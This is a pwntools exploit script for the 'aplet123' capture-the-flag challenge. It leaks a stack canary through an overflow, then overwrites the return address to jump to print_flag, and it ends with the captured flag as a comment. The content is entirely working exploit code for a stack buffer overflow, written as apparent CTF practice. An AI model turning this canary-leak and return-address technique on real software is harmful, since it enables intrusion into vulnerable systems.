#!/usr/bin/env python3

from pwn import *
from time import sleep

exe = ELF("./aplet123_patched")

context.binary = exe

REMOTE_NC_CMD    = "nc chall.lac.tf 31123"    # `nc <host> <port>`

bstr = lambda x: str(x).encode()
ELF.binsh = lambda self: next(self.search(b"/bin/sh\0"))

GDB_SCRIPT = """
set follow-fork-mode parent
set follow-exec-mode same
b *main+271
c
"""

def conn():
    if args.LOCAL:
        return process([exe.path])
    
    if args.GDB:
        return gdb.debug([exe.path], gdbscript=GDB_SCRIPT)
    
    return remote(REMOTE_NC_CMD.split()[1], int(REMOTE_NC_CMD.split()[2]))

def main():
    r = conn()
    
    r.sendline(b"A"*69+b"i'm")
    r.recvuntil(b"hello\n")
    canary=r.recvuntil(b",")[3:-2].rjust(8, b"\x00")

    r.sendline(b"A"*72+canary+p64(exe.sym.print_flag)*2)

    r.sendline(b"bye")

    r.interactive()
    #lactf{so_untrue_ei2p1wfwh9np2gg6}

if __name__ == "__main__":
    main()